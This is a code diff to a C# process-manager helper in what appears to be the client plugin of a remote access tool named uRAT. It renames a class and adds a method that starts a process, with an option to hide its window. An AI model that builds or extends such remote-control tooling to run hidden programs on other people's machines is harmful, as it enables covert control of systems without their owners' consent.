@@ -7,7 +7,7 @@ using System.Text;
 
 namespace uRAT.ManagersClientPlugin.ProcessManager.Tools
 {
-    public static class ProcessesHelper
+    public static class ProcessHelper
     {
         public class HighLevelProcess
         {
@@ -29,6 +29,18 @@ namespace uRAT.ManagersClientPlugin.ProcessManager.Tools
             }
         }
 
+        public struct StartProcessOptions
+        {
+            public string Filename;
+            public bool NoWindow;
+
+            public StartProcessOptions(string filename, bool noWindow)
+            {
+                Filename = filename;
+                NoWindow = noWindow;
+            }
+        }
+
         public static void KillProcessByPid(int pid)
         {
             try
@@ -44,6 +56,19 @@ namespace uRAT.ManagersClientPlugin.ProcessManager.Tools
         public static List<HighLevelProcess> GetRunningProcesses()
         {
             return GetRunningProcessesImpl().ToList();
+        }
+
+        public static void StartProcess(StartProcessOptions options)
+        {
+            var proc = new Process
+            {
+                StartInfo =
+                {
+                    FileName = options.Filename, 
+                    CreateNoWindow = options.NoWindow
+                }
+            };
+            proc.Start();
         }
 
         private static IEnumerable<HighLevelProcess> GetRunningProcessesImpl()
